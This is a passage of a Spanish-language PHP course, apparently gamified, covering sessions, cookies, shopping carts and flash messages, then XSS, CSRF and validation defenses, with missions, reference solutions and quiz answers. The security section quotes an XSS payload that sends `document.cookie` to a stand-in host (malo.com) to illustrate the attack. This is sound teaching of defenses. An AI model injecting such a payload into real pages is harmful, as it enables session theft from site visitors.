Mirando `$_SERVER['REQUEST_METHOD']`: si es `POST`, se procesa; si es `GET`, se muestra.

#### ¿Por qué no alcanza con `required` en el HTML?

Porque la validación del navegador se puede saltear; la única que vale es la que hace el servidor con `$_POST`.

#### ¿Cómo se reciben varios checkboxes tildados?

Poniéndoles `name="algo[]"`: en `$_POST['algo']` llega un array con los valores tildados.

#### ¿Qué problema resuelve el patrón POST-Redirect-GET?

Evita que al recargar la página (F5) se vuelva a mandar el formulario: después de procesar se redirige a otra página con GET.

#### ¿Por qué hay que poner `exit` después de `header('Location: …')`?

Porque `header` no corta el programa: sin `exit`, el resto del script sigue ejecutándose.

### Soluciones (docente)

Nodo nuevo. El ejemplo junta todos los tipos de campo; conviene abrir las herramientas del navegador (F12 → Red) para ver el POST, su cuerpo y el 303 de la redirección. En el encargo, la fecha "posterior a hoy" depende del día en que se pruebe: en las pruebas automáticas se usa una fecha lejana.

## R03-N04 · Sesiones y cookies

```meta
tipo: tema
padre: R03-N03
precio: 10
criatura: troll
temas: web.sesiones
```

### Crónica

Cada vez que alguien se acerca a la ventanilla de la fonda, el mozo le pregunta de nuevo qué quería. *"Ya te lo dije hace cinco minutos"*, protesta la clienta. El mozo no tiene memoria: atiende a cada uno como si fuera la primera vez. Hasta que {mentor} le da un talonario de fichas numeradas: a cada cliente le entrega una, y en su libreta anota lo que pidió cada número.

—HTTP no tiene memoria —explica {mentor}—: cada pedido llega solo, sin saber nada del anterior. Para acordarse de alguien, el servidor le da una **ficha** (una *cookie*) y anota en su libreta todo lo de esa ficha (la *sesión*). Así funcionan los carritos y los inicios de sesión, {heroe}. Y quien roba una ficha, se hace pasar por su dueño.

### Objetivos

- Entender por qué HTTP necesita sesiones para "recordar" entre pedidos.
- Usar `session_start()` y `$_SESSION` para guardar datos de cada visitante.
- Armar un carrito de compras que dura entre páginas.
- Mostrar mensajes de una sola vez ("flash") después de redirigir.
- Crear, leer y borrar cookies con `setcookie` y `$_COOKIE`, con opciones seguras.
- Cerrar una sesión.

### Antes de empezar

- Formularios con POST y POST-Redirect-GET (R03-N03).

### Explicación

#### HTTP no se acuerda
Cada pedido es independiente: si en `agregar.php` guardás algo en una variable,
cuando llega el próximo pedido a `carrito.php` esa variable ya no existe. Hace
falta un lugar que dure entre pedidos.

#### Sesiones
```php
session_start();                          // al principio, antes de imprimir nada
$_SESSION['visitas'] = ($_SESSION['visitas'] ?? 0) + 1;
echo "Nos visitaste {$_SESSION['visitas']} veces";
```
- `session_start()` busca la **cookie de sesión** (`PHPSESSID`) que manda el
  navegador; si no hay, crea una sesión nueva y le manda la cookie.
- `$_SESSION` es un array que PHP **guarda en el servidor** (en un archivo) y
  recupera en cada pedido de ese mismo navegador.
- Como manda una cookie (un encabezado), va **antes de cualquier salida**, igual
  que `header()`.

Los datos de la sesión están en el servidor: el visitante solo tiene el número de
su ficha. Por eso ahí se guarda quién inició sesión, el carrito, los permisos.

#### Un carrito
```php
session_start();
$_SESSION['carrito'] ??= [];                                   // producto => cantidad
$producto = $_POST['producto'] ?? '';
$_SESSION['carrito'][$producto] = ($_SESSION['carrito'][$producto] ?? 0) + 1;
unset($_SESSION['carrito']['yerba']);                         // sacar uno
$_SESSION['carrito'] = [];                                    // vaciar
```

#### Mensajes flash
Después de un POST-Redirect-GET, ¿cómo mostrás "¡Agregado!" en la página siguiente
sin ponerlo en la dirección? Se guarda en la sesión y se **borra al mostrarlo**:
```php
// al procesar:
$_SESSION['flash'] = 'Agregaste yerba al carrito.';
header('Location: carrito.php', true, 303);
exit;

// en la página siguiente:
$flash = $_SESSION['flash'] ?? null;
unset($_SESSION['flash']);          // se muestra una sola vez
```

#### Cerrar la sesión
```php
session_start();
$_SESSION = [];             // vacía los datos
session_destroy();          // borra la sesión del servidor
```

#### Cookies
Una **cookie** es un dato chico que el servidor le pide al navegador que guarde y
que el navegador devuelve en cada pedido. A diferencia de la sesión, **vive en el
navegador**: la persona puede verla y cambiarla.
```php
setcookie('tema', 'oscuro', [
    'expires' => time() + 60 * 60 * 24 * 30,   // 30 días (sin esto, dura hasta cerrar el navegador)
    'path' => '/',
    'httponly' => true,                        // JavaScript no la puede leer
    'samesite' => 'Lax',                       // no se manda desde otros sitios
]);
$tema = $_COOKIE['tema'] ?? 'claro';           // se lee en el PRÓXIMO pedido
setcookie('tema', '', ['expires' => time() - 3600, 'path' => '/']);   // borrarla: vencida
```
- `setcookie` también va antes de imprimir.
- Lo que ponés con `setcookie` **no** aparece en `$_COOKIE` hasta el pedido
  siguiente.
- Como el visitante la puede cambiar, en una cookie se guardan **preferencias**
  (tema, idioma, "recordar mi usuario"), nunca permisos ni precios.

#### ¿Sesión o cookie?
| | Sesión | Cookie |
|---|---|---|
| dónde vive el dato | en el servidor | en el navegador |
| lo puede cambiar el visitante | no | sí |
| cuánto dura | hasta cerrar el navegador o que venza (unos minutos sin uso) | lo que digas en `expires` |
| para | usuario logueado, carrito, mensajes flash | preferencias, recordar cosas chicas |

### Código de ejemplo

`tienda.php`
```php
<?php
declare(strict_types=1);
/*
 * La fonda con memoria: carrito en la sesión, mensajes flash y una cookie de preferencia.
 */
session_start();

const MENU = ['empanada' => 900, 'locro' => 6500, 'mate cocido' => 700, 'pastelito' => 800];
$_SESSION['carrito'] ??= [];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $accion = $_POST['accion'] ?? '';
    $plato = $_POST['plato'] ?? '';
    if ($accion === 'agregar' && isset(MENU[$plato])) {
        $_SESSION['carrito'][$plato] = ($_SESSION['carrito'][$plato] ?? 0) + 1;
        $_SESSION['flash'] = "Agregaste $plato.";
    } elseif ($accion === 'quitar' && isset($_SESSION['carrito'][$plato])) {
        unset($_SESSION['carrito'][$plato]);
        $_SESSION['flash'] = "Sacaste $plato.";
    } elseif ($accion === 'vaciar') {
        $_SESSION['carrito'] = [];
        $_SESSION['flash'] = 'Carrito vacío.';
    } elseif ($accion === 'tema') {
        $tema = ($_POST['tema'] ?? '') === 'oscuro' ? 'oscuro' : 'claro';
        setcookie('tema', $tema, ['expires' => time() + 60 * 60 * 24 * 30, 'path' => '/', 'httponly' => true, 'samesite' => 'Lax']);
        $_SESSION['flash'] = "Tema $tema guardado.";
    }
    header('Location: tienda.php', true, 303);
    exit;
}

$flash = $_SESSION['flash'] ?? null;
unset($_SESSION['flash']);
$tema = ($_COOKIE['tema'] ?? 'claro') === 'oscuro' ? 'oscuro' : 'claro';
$total = 0;
foreach ($_SESSION['carrito'] as $plato => $cantidad) {
    $total += MENU[$plato] * $cantidad;
}
?>
<!DOCTYPE html>
<html lang="es">
<head><meta charset="utf-8"><title>Fonda</title></head>
<body class="tema-<?= $tema ?>">
    <h1>Fonda La Trompa Alegre</h1>
    <?php if ($flash !== null): ?>
        <p><strong><?= htmlspecialchars($flash) ?></strong></p>
    <?php endif; ?>

    <h2>Menú</h2>
    <?php foreach (MENU as $plato => $precio): ?>
        <form method="post">
            <?= htmlspecialchars($plato) ?> ($<?= $precio ?>)
            <input type="hidden" name="plato" value="<?= htmlspecialchars($plato) ?>">
            <button name="accion" value="agregar">Agregar</button>
        </form>
    <?php endforeach; ?>

    <h2>Tu pedido</h2>
    <?php if ($_SESSION['carrito'] === []): ?>
        <p>Todavía no pediste nada.</p>
    <?php else: ?>
        <ul>
            <?php foreach ($_SESSION['carrito'] as $plato => $cantidad): ?>
                <li><?= $cantidad ?> × <?= htmlspecialchars($plato) ?> = $<?= MENU[$plato] * $cantidad ?></li>
            <?php endforeach; ?>
        </ul>
        <p>Total: $<?= $total ?></p>
        <form method="post"><button name="accion" value="vaciar">Vaciar</button></form>
    <?php endif; ?>

    <form method="post">
        <input type="hidden" name="accion" value="tema">
        <button name="tema" value="<?= $tema === 'oscuro' ? 'claro' : 'oscuro' ?>">Cambiar a tema <?= $tema === 'oscuro' ? 'claro' : 'oscuro' ?></button>
    </form>
</body>
</html>
```

### ¿Para qué sirve?

Sin sesiones no existirían los carritos de compra, los usuarios logueados ni los mensajes de "¡Guardado!". Toda aplicación web con usuarios las usa (Laravel las maneja por vos, pero por debajo es `session_start` y una cookie). Entender la diferencia entre lo que vive en el servidor y lo que vive en el navegador es la base de la seguridad de un sistema.

### Errores habituales

**Slime: `session_start` tarde.** `session_start(): Session cannot be started after
headers have already been sent`: llamalo al principio, antes de cualquier salida.

**Esqueleto: olvidarse `session_start`.** Sin él, `$_SESSION` no se carga ni se
guarda: el carrito "se vacía" en cada página. Cada página que use la sesión lo
necesita.

**Troll: confiar en una cookie.** Si guardás `rol=admin` o un precio en una cookie,
cualquiera la cambia desde el navegador. Lo que importa va en la sesión.

**Ogro: leer la cookie recién puesta.** `setcookie('tema', 'oscuro')` y en la línea
siguiente `$_COOKIE['tema']` todavía tiene el valor viejo: llega en el próximo
pedido.

**Troll: el flash que no se borra.** Si no hacés `unset` al mostrarlo, el mensaje
aparece en todas las páginas siguientes.

### Misión R03-N04-M1 · El contador de la torre

```meta
entrega: codigo
entorno: local
monedas: 4
xp: 10
```

#### Consigna

Escribí `torre.php` que, con la sesión, lleve:

- cuántas veces el visitante abrió la página (`Subiste N vez/veces a la torre.`);
- la **hora de la primera visita** (`date('H:i:s')`, guardada solo la primera vez);
- las **últimas 3** páginas de un recorrido: la página recibe `?piso=N` (1 a 5) y
  guarda los pisos visitados, mostrando los últimos tres (`array_slice` con
  negativos).

Un botón `Bajar de la torre` (POST) cierra la sesión y redirige a la misma página,
que vuelve a empezar de cero.

#### Criterio de aprobación

- Usa `session_start()` y `$_SESSION` para los tres datos.
- La hora de la primera visita no se pisa.
- El botón vacía y destruye la sesión, y redirige.

#### Solución de referencia

```php
<?php
declare(strict_types=1);
// Mision 1 - El contador de la torre: datos que duran entre pedidos.
session_start();
date_default_timezone_set('America/Argentina/Buenos_Aires');

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $_SESSION = [];
    session_destroy();
    header('Location: torre.php', true, 303);
    exit;
}

$_SESSION['visitas'] = ($_SESSION['visitas'] ?? 0) + 1;
$_SESSION['primera'] ??= date('H:i:s');
$_SESSION['pisos'] ??= [];
$piso = filter_var($_GET['piso'] ?? '', FILTER_VALIDATE_INT, ['options' => ['min_range' => 1, 'max_range' => 5]]);
if ($piso !== false) {
    $_SESSION['pisos'][] = $piso;
}
$ultimos = array_slice($_SESSION['pisos'], -3);
?>
<!DOCTYPE html>
<html lang="es">
<head><meta charset="utf-8"><title>Torre</title></head>
<body>
    <p>Subiste <?= $_SESSION['visitas'] ?> vez/veces a la torre.</p>
    <p>Primera visita: <?= $_SESSION['primera'] ?></p>
    <p>Últimos pisos: <?= $ultimos === [] ? 'ninguno' : implode(' → ', $ultimos) ?></p>
    <p>
        <?php for ($p = 1; $p <= 5; $p++): ?>
            <a href="?piso=<?= $p ?>">Piso <?= $p ?></a>
        <?php endfor; ?>
    </p>
    <form method="post"><button>Bajar de la torre</button></form>
</body>
</html>
```

### Misión R03-N04-M2 · El carrito del almacén

```meta
entrega: codigo
entorno: local
monedas: 4
xp: 10
```

#### Consigna

Escribí `almacen.php` con un carrito guardado en la sesión. La lista de productos
(con precio y **stock**) es una constante. Cada producto tiene un formulario POST
con una cantidad y el botón **Agregar**. Reglas:

- la cantidad es un entero de 1 a 10;
- no se puede agregar más de lo que hay en stock (sumando lo que ya está en el
  carrito): mostrá `No hay suficiente yerba (quedan 2).`;
- cada acción redirige (PRG) y muestra un **mensaje flash** con el resultado;
- el carrito muestra cada producto con su subtotal, un botón **Quitar** por
  producto y el total.

#### Criterio de aprobación

- El carrito vive en `$_SESSION` y respeta el stock.
- Cada POST redirige y el mensaje se muestra una sola vez.
- Valida la cantidad y el producto.

#### Solución de referencia

```php
<?php
declare(strict_types=1);
// Mision 2 - El carrito del almacén: sesión, stock y mensajes flash.
session_start();
const PRODUCTOS = [
    'yerba' => ['precio' => 4200, 'stock' => 5],
    'azúcar' => ['precio' => 1500, 'stock' => 10],
    'fideos' => ['precio' => 1100, 'stock' => 3],
];
$_SESSION['carrito'] ??= [];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $producto = $_POST['producto'] ?? '';
    if (!isset(PRODUCTOS[$producto])) {
        $_SESSION['flash'] = 'Producto desconocido.';
    } elseif (($_POST['accion'] ?? '') === 'quitar') {
        unset($_SESSION['carrito'][$producto]);
        $_SESSION['flash'] = "Sacaste $producto.";
    } else {
        $cantidad = filter_var($_POST['cantidad'] ?? '', FILTER_VALIDATE_INT, ['options' => ['min_range' => 1, 'max_range' => 10]]);
        $enCarrito = $_SESSION['carrito'][$producto] ?? 0;
        $quedan = PRODUCTOS[$producto]['stock'] - $enCarrito;
        if ($cantidad === false) {
            $_SESSION['flash'] = 'La cantidad va de 1 a 10.';
        } elseif ($cantidad > $quedan) {
            $_SESSION['flash'] = "No hay suficiente $producto (quedan $quedan).";
        } else {
            $_SESSION['carrito'][$producto] = $enCarrito + $cantidad;
            $_SESSION['flash'] = "Agregaste $cantidad de $producto.";
        }
    }
    header('Location: almacen.php', true, 303);
    exit;
}

$flash = $_SESSION['flash'] ?? null;
unset($_SESSION['flash']);
$total = 0;
?>
<!DOCTYPE html>
<html lang="es">
<head><meta charset="utf-8"><title>Almacén</title></head>
<body>
    <h1>Almacén del Puerto</h1>
    <?php if ($flash !== null): ?><p><strong><?= htmlspecialchars($flash) ?></strong></p><?php endif; ?>
    <?php foreach (PRODUCTOS as $nombre => $p): ?>
        <form method="post">
            <?= $nombre ?> ($<?= $p['precio'] ?>)
            <input type="hidden" name="producto" value="<?= $nombre ?>">
            <input type="number" name="cantidad" value="1" min="1" max="10">
            <button name="accion" value="agregar">Agregar</button>
        </form>
    <?php endforeach; ?>
    <h2>Carrito</h2>
    <ul>
        <?php foreach ($_SESSION['carrito'] as $nombre => $cantidad): ?>
            <?php $subtotal = $cantidad * PRODUCTOS[$nombre]['precio']; $total += $subtotal; ?>
            <li>
                <form method="post"><?= $cantidad ?> × <?= $nombre ?> = $<?= $subtotal ?>
                    <input type="hidden" name="producto" value="<?= $nombre ?>">
                    <button name="accion" value="quitar">Quitar</button></form>
            </li>
        <?php endforeach; ?>
    </ul>
    <p>Total: $<?= $total ?></p>
</body>
</html>
```

### Misión R03-N04-M3 · El idioma de la oficina

```meta
entrega: codigo
entorno: local
monedas: 4
xp: 10
```

#### Consigna

La Oficina de Correos atiende en tres idiomas. Escribí `oficina.php` que guarda el
idioma elegido en una **cookie** que dura 90 días (`es`, `en` o `pt`), con
`httponly` y `samesite=Lax`. Los textos de la página salen de un array
`TEXTOS[idioma][clave]` (título, saludo, botón). Tres enlaces cambian el idioma con
`?idioma=xx`: la página pone la cookie y **redirige** a `oficina.php` (sin el
parámetro). Si la cookie trae un idioma que no existe (alguien la cambió), se usa
`es`. Mostrá también desde cuándo se eligió ese idioma (otra cookie con la fecha).

#### Criterio de aprobación

- El idioma vive en una cookie con opciones seguras y se valida al leerla.
- Cambiar de idioma redirige.
- Los textos salen de un array por idioma.

#### Solución de referencia

```php
<?php
declare(strict_types=1);
// Mision 3 - El idioma de la oficina: una preferencia en una cookie.
date_default_timezone_set('America/Argentina/Buenos_Aires');
const TEXTOS = [
    'es' => ['titulo' => 'Oficina de Correos', 'saludo' => '¡Bienvenida!', 'boton' => 'Enviar carta'],
    'en' => ['titulo' => 'Post Office', 'saludo' => 'Welcome!', 'boton' => 'Send letter'],
    'pt' => ['titulo' => 'Agência dos Correios', 'saludo' => 'Bem-vinda!', 'boton' => 'Enviar carta'],
];
$opciones = ['expires' => time() + 60 * 60 * 24 * 90, 'path' => '/', 'httponly' => true, 'samesite' => 'Lax'];

if (isset($_GET['idioma'])) {
    if (isset(TEXTOS[$_GET['idioma']])) {
        setcookie('idioma', $_GET['idioma'], $opciones);
        setcookie('idioma_desde', date('d/m/Y'), $opciones);
    }
    header('Location: oficina.php', true, 303);
    exit;
}

$idioma = isset(TEXTOS[$_COOKIE['idioma'] ?? '']) ? $_COOKIE['idioma'] : 'es';
$t = TEXTOS[$idioma];
?>
<!DOCTYPE html>
<html lang="<?= $idioma ?>">
<head><meta charset="utf-8"><title><?= $t['titulo'] ?></title></head>
<body>
    <h1><?= $t['titulo'] ?></h1>
    <p><?= $t['saludo'] ?></p>
    <button><?= $t['boton'] ?></button>
    <?php if (isset($_COOKIE['idioma_desde'])): ?>
        <p>Idioma elegido el <?= htmlspecialchars($_COOKIE['idioma_desde']) ?></p>
    <?php endif; ?>
    <p><a href="?idioma=es">Español</a> · <a href="?idioma=en">English</a> · <a href="?idioma=pt">Português</a></p>
</body>
</html>
```

### Encargo R03-N04-E1 · El asistente de alta en tres pasos

```meta
entrega: codigo
entorno: local
monedas: 1
xp: 15
```

#### Consigna

Un club de barrio quiere el alta de socios en **tres pasos**, cada uno en su propio
formulario, guardando lo cargado en la **sesión** hasta el final:

1. datos personales (nombre y DNI de 7 u 8 dígitos);
2. actividad (`fútbol`, `natación`, `patín`) y turno (`mañana`, `tarde`);
3. confirmación: muestra todo lo cargado y un botón **Confirmar**, que muestra
   `Alta confirmada: NOMBRE en ACTIVIDAD (TURNO). Cuota: $N.` (fútbol $18000,
   natación $24000, patín $15000; a la mañana 10% menos) y **borra** los datos del
   alta de la sesión.

`alta.php` decide qué paso mostrar con `$_SESSION['paso']`. Cada POST valida su
paso: si hay errores se queda en el mismo; si no, avanza (PRG). Un enlace
**Volver** retrocede un paso sin perder lo cargado. No se puede llegar al paso 3
sin haber completado los anteriores.

#### Criterio de aprobación

- Los datos de cada paso se guardan en la sesión hasta confirmar.
- Cada paso valida lo suyo; no se saltea ningún paso.
- Al confirmar, se limpia la sesión del alta.

#### Solución de referencia

```php
<?php
declare(strict_types=1);
// Encargo - El asistente de alta en tres pasos: un formulario largo repartido con la sesión.
session_start();
const CUOTAS = ['fútbol' => 18000, 'natación' => 24000, 'patín' => 15000];
const TURNOS = ['mañana', 'tarde'];

$_SESSION['alta'] ??= ['paso' => 1, 'datos' => []];
$alta = &$_SESSION['alta'];
$errores = [];
$confirmado = null;

if (isset($_GET['volver']) && $alta['paso'] > 1) {
    $alta['paso']--;
    header('Location: alta.php', true, 303);
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if ($alta['paso'] === 1) {
        $nombre = trim($_POST['nombre'] ?? '');
        $dni = trim($_POST['dni'] ?? '');
        if ($nombre === '') {
            $errores[] = 'Falta el nombre.';
        }
        if (!preg_match('/^\d{7,8}$/', $dni)) {
            $errores[] = 'El DNI tiene 7 u 8 dígitos.';
        }
        if ($errores === []) {
            $alta['datos']['nombre'] = $nombre;
            $alta['datos']['dni'] = $dni;
            $alta['paso'] = 2;
        }
    } elseif ($alta['paso'] === 2) {
        $actividad = $_POST['actividad'] ?? '';
        $turno = $_POST['turno'] ?? '';
        if (!isset(CUOTAS[$actividad]) || !in_array($turno, TURNOS, true)) {
            $errores[] = 'Elegí una actividad y un turno de la lista.';
        } else {
            $alta['datos']['actividad'] = $actividad;
            $alta['datos']['turno'] = $turno;
            $alta['paso'] = 3;
        }
    } elseif ($alta['paso'] === 3) {
        $d = $alta['datos'];
        $cuota = CUOTAS[$d['actividad']] * ($d['turno'] === 'mañana' ? 0.9 : 1);
        $_SESSION['flash'] = "Alta confirmada: {$d['nombre']} en {$d['actividad']} ({$d['turno']}). Cuota: \$$cuota.";
        unset($_SESSION['alta']);
    }
    if ($errores === []) {
        header('Location: alta.php', true, 303);
        exit;
    }
}

$flash = $_SESSION['flash'] ?? null;
unset($_SESSION['flash']);
$d = $alta['datos'] ?? [];
$h = fn(?string $s): string => htmlspecialchars($s ?? '');
?>
<!DOCTYPE html>
<html lang="es">
<head><meta charset="utf-8"><title>Alta de socios</title></head>
<body>
    <h1>Club Social del Puerto</h1>
    <?php if ($flash !== null): ?><p><strong><?= $h($flash) ?></strong></p><?php endif; ?>
    <?php foreach ($errores as $e): ?><p><?= $e ?></p><?php endforeach; ?>
    <p>Paso <?= $alta['paso'] ?> de 3</p>
    <?php if ($alta['paso'] === 1): ?>
        <form method="post">
            <input name="nombre" value="<?= $h($d['nombre'] ?? null) ?>" placeholder="Nombre">
            <input name="dni" value="<?= $h($d['dni'] ?? null) ?>" placeholder="DNI">
            <button>Siguiente</button>
        </form>
    <?php elseif ($alta['paso'] === 2): ?>
        <form method="post">
            <select name="actividad">
                <?php foreach (array_keys(CUOTAS) as $a): ?>
                    <option <?= ($d['actividad'] ?? '') === $a ? 'selected' : '' ?>><?= $a ?></option>
                <?php endforeach; ?>
            </select>
            <?php foreach (TURNOS as $t): ?>
                <label><input type="radio" name="turno" value="<?= $t ?>" <?= ($d['turno'] ?? '') === $t ? 'checked' : '' ?>> <?= $t ?></label>
            <?php endforeach; ?>
            <button>Siguiente</button>
        </form>
        <p><a href="?volver=1">Volver</a></p>
    <?php else: ?>
        <ul>
            <li>Nombre: <?= $h($d['nombre']) ?> (DNI <?= $h($d['dni']) ?>)</li>
            <li>Actividad: <?= $h($d['actividad']) ?>, turno <?= $h($d['turno']) ?></li>
        </ul>
        <form method="post"><button>Confirmar</button></form>
        <p><a href="?volver=1">Volver</a></p>
    <?php endif; ?>
</body>
</html>
```

### Prueba del sello

#### ¿Por qué hacen falta las sesiones?

Porque HTTP no recuerda nada entre pedidos: la sesión guarda datos de cada visitante en el servidor y los recupera en cada pedido gracias a una cookie.

#### ¿Dónde se guardan los datos de `$_SESSION` y dónde los de `$_COOKIE`?

Los de la sesión, en el servidor; los de la cookie, en el navegador (y el visitante los puede cambiar).

#### ¿Qué es un mensaje flash?

Un mensaje que se guarda en la sesión para mostrarlo en el pedido siguiente (después de redirigir) y se borra al mostrarlo.

#### ¿Por qué no se guarda el rol de un usuario en una cookie?

Porque el visitante puede cambiar la cookie y darse el rol que quiera; lo que importa para la seguridad va en la sesión.

#### ¿Por qué `$_COOKIE` no tiene el valor recién puesto con `setcookie`?

Porque `setcookie` le pide al navegador que la guarde, y el navegador la manda recién en el pedido siguiente.

### Soluciones (docente)

Nodo nuevo. En el encargo, `$alta = &$_SESSION['alta']` es una referencia para no escribir `$_SESSION['alta']` en cada línea; es un buen momento para repasar referencias (R01-N08). Para ver las cookies: F12 → Aplicación (o Almacenamiento) → Cookies.

## R03-N05 · Seguridad: XSS, CSRF y validación del lado del servidor

```meta
tipo: tema
padre: R03-N04
precio: 10
criatura: troll
temas: web.seguridad
usa: web.formularios
```

### Crónica

Una mañana, el tablero de avisos de la Oficina de Correos amaneció diciendo *"¡Todos los envíos gratis hoy!"*. Nadie lo había escrito: alguien dejó un aviso con un truco escondido, y el tablero lo ejecutó en lugar de mostrarlo. Esa misma semana, un pedido de "transferir 100 sellos" llegó con la firma de la tesorera… desde una carta que ella nunca mandó.

—Ahora que tu oficina recibe mensajes de todo el mundo, {heroe}, también recibe **trampas** —dice {mentor}, cerrando la puerta con llave—. La regla del Puerto: **todo lo que llega de afuera es sospechoso**. Se valida al entrar, se escapa al mostrar, y cada formulario lleva un sello que solo nosotros sabemos poner.

### Objetivos

- Entender el ataque XSS y evitarlo escapando **toda** salida con `htmlspecialchars`.
- Escapar según el contexto: HTML, atributos, direcciones.
- Entender el ataque CSRF y proteger los formularios con un token en la sesión.
- Validar en el servidor todo lo que llega (tipos, rangos, listas), sin confiar en el navegador.
- Evitar las redirecciones abiertas y los errores que muestran demasiado.

### Antes de empezar

- Formularios con POST (R03-N03) y sesiones (R03-N04).

### Explicación

#### XSS: cuando tu página ejecuta código ajeno
Si mostrás lo que escribió alguien **sin escapar**:
```php
echo "<p>Comentario: {$_POST['comentario']}</p>";
```
y ese alguien escribe `<script>fetch('https://malo.com/?c='+document.cookie)</script>`,
tu página **ejecuta** ese JavaScript en el navegador de **todos** los que la vean:
puede robar sesiones, cambiar la página, mandar pedidos en su nombre. Se llama
**XSS** (*cross-site scripting*) y es de los ataques más comunes de la web.

La defensa: **escapar al mostrar**, siempre:
```php
function e(string $texto): string
{
    return htmlspecialchars($texto, ENT_QUOTES, 'UTF-8');
}
echo '<p>Comentario: ' . e($comentario) . '</p>';
// se ve el texto <script>…</script>, pero no se ejecuta
```
Regla: **toda variable que va al HTML pasa por `e()`**, aunque creas que es
segura. Los datos que "vos" guardaste también vinieron de alguien.

#### Escapar según el lugar
| Dónde va | Cómo |
|---|---|
| texto de la página o un atributo (`value="…"`, `title="…"`) | `htmlspecialchars` (con `ENT_QUOTES`, que es lo que hace desde PHP 8.1) |
| un valor dentro de una dirección (`?q=…`) | `urlencode` / `http_build_query`, y después `htmlspecialchars` para el HTML |
| una dirección entera en un `href` | validar que empiece con `http://` o `https://` (si no, `javascript:alert(1)` es un enlace válido) |
| adentro de un `<script>` | `json_encode` (y en la Senda de JavaScript vas a ver alternativas mejores) |

#### CSRF: el pedido que no mandaste
Tu sistema tiene un formulario para transferir sellos que hace POST a
`transferir.php`. Otra página, en otro sitio, tiene un formulario invisible que
también hace POST a **tu** `transferir.php`. Si una persona logueada en tu sistema
entra a esa página, **su navegador manda el pedido con su cookie de sesión**, y tu
servidor lo acepta como si ella lo hubiera pedido. Eso es **CSRF**
(*cross-site request forgery*).

La defensa es un **token**: un número secreto al azar que se guarda en la sesión y
se pone en cada formulario. El otro sitio no lo conoce, así que no lo puede mandar:
```php
// al mostrar el formulario:
$_SESSION['csrf'] ??= bin2hex(random_bytes(32));
echo '<input type="hidden" name="csrf" value="' . $_SESSION['csrf'] . '">';

// al procesar:
if (!hash_equals($_SESSION['csrf'] ?? '', $_POST['csrf'] ?? '')) {
    http_response_code(403);
    exit('Pedido no válido.');
}
```
- `random_bytes` genera bytes impredecibles (nunca uses `rand()` para esto).
- `hash_equals` compara sin filtrar por el tiempo que tarda (a diferencia de `===`).
- Además, las cookies de sesión con `samesite=Lax` (el valor por defecto de los
  navegadores actuales) ya frenan muchos de estos pedidos. El token es la segunda
  llave.

#### Validar en el servidor
El navegador es del visitante: puede borrar el `required`, cambiar un `<select>`,
mandar un POST con los campos que quiera. **Todo** se valida en PHP:
- que el campo **exista** (`?? ''`);
- el **tipo** (`filter_var`);
- el **rango** o el **largo**;
- que esté en la **lista** de valores posibles (`in_array(…, true)`, enums);
- y los **permisos**: que ese usuario pueda hacer eso con ese dato.

#### Otros descuidos
- **Redirección abierta**: `header('Location: ' . $_GET['volver'])` deja que te
  usen para mandar gente a cualquier sitio. Solo redirigí a rutas **tuyas**
  (validá que empiece con `/` y no con `//`).
- **Mostrar los errores al público**: en un servidor real, `display_errors`
  va apagado; los mensajes de PHP dan pistas (rutas, consultas) a quien ataca.
- **Datos ocultos no son secretos**: un `<input type="hidden" name="precio">` lo
  cambia cualquiera. El precio se busca en el servidor.

### Código de ejemplo

`tablero.php`
```php
<?php
declare(strict_types=1);
/*
 * El tablero de avisos: escapar toda salida, token CSRF y validación en el servidor.
 */
session_start();

function e(string $texto): string
{
    return htmlspecialchars($texto, ENT_QUOTES, 'UTF-8');
}

function tokenCsrf(): string
{
    return $_SESSION['csrf'] ??= bin2hex(random_bytes(32));
}

function csrfValido(): bool
{
    return hash_equals($_SESSION['csrf'] ?? '', $_POST['csrf'] ?? '');
}

/** Solo rutas internas: "/algo", nunca "//otro-sitio" ni "https://…". */
function rutaSegura(string $ruta): string
{
    return str_starts_with($ruta, '/') && !str_starts_with($ruta, '//') ? $ruta : '/tablero.php';
}

const CATEGORIAS = ['aviso', 'pedido', 'objeto perdido'];
$_SESSION['avisos'] ??= [];
$errores = [];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (!csrfValido()) {
        http_response_code(403);
        exit('Pedido no válido: el formulario venció o no es de este sitio.');
    }
    $autor = trim($_POST['autor'] ?? '');
    $texto = trim($_POST['texto'] ?? '');
    $categoria = $_POST['categoria'] ?? '';
    if ($autor === '' || mb_strlen($autor) > 40) {
        $errores[] = 'El autor va de 1 a 40 caracteres.';
    }
    if ($texto === '' || mb_strlen($texto) > 280) {
        $errores[] = 'El aviso va de 1 a 280 caracteres.';
    }
    if (!in_array($categoria, CATEGORIAS, true)) {
        $errores[] = 'Categoría inválida.';
    }
    if ($errores === []) {
        $_SESSION['avisos'][] = ['autor' => $autor, 'texto' => $texto, 'categoria' => $categoria];
        header('Location: ' . rutaSegura($_POST['volver'] ?? ''), true, 303);
        exit;
    }
}
?>
<!DOCTYPE html>
<html lang="es">
<head><meta charset="utf-8"><title>Tablero</title></head>
<body>
    <h1>Tablero de avisos</h1>
    <?php foreach ($errores as $error): ?>
        <p><strong><?= e($error) ?></strong></p>
    <?php endforeach; ?>
    <ul>
        <?php foreach ($_SESSION['avisos'] as $aviso): ?>
            <li>[<?= e($aviso['categoria']) ?>] <?= e($aviso['texto']) ?> — <em><?= e($aviso['autor']) ?></em></li>
        <?php endforeach; ?>
    </ul>
    <form method="post">
        <input type="hidden" name="csrf" value="<?= tokenCsrf() ?>">
        <input type="hidden" name="volver" value="/tablero.php">
        <input name="autor" value="<?= e($_POST['autor'] ?? '') ?>" placeholder="Tu nombre">
        <select name="categoria">
            <?php foreach (CATEGORIAS as $c): ?>
                <option><?= e($c) ?></option>
            <?php endforeach; ?>
        </select>
        <textarea name="texto"><?= e($_POST['texto'] ?? '') ?></textarea>
        <button>Publicar</button>
    </form>
</body>
</html>
```

### ¿Para qué sirve?

XSS y CSRF están desde hace años en la lista de las fallas más comunes de la web (el OWASP Top 10). Un sistema que no escapa ni valida termina con sesiones robadas, datos cambiados o usado para engañar a otros. Laravel escapa solo en sus plantillas (`{{ $x }}`) y agrega el token CSRF en cada formulario (`@csrf`): ahora sabés por qué y qué pasa si se saltea.

### Errores habituales

**Troll: el `echo` sin escapar.** Un solo `<?= $comentario ?>` sin `e()` alcanza para
un XSS. Buscá en tu código cada `<?=` y cada `echo` con datos.

**Troll: escapar al guardar en lugar de al mostrar.** Si guardás el texto ya
